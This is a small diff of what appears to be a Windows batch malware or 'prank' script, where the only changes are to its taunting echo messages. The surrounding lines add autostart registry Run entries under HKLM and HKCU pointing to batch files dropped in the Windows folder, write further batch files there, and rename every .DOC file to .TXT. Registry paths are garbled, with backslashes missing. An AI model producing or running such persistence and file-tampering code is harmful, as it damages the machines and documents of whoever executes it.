@@ -18,7 +18,7 @@ reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI 
 
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
 
-echo You Have Been Hacked echo @echo off>c:windowswimn32.bat
+echo Why Would You Do This echo @echo off>c:windowswimn32.bat
 
 echo break off>>c:windowswimn32.bat
 
@@ -30,7 +30,7 @@ reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAP
 
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
 
-echo YOU HAVE BEEN HACKED
+echo YOU HAVE BEEN TOTOB12
 
 REN *.DOC *.TXT
 
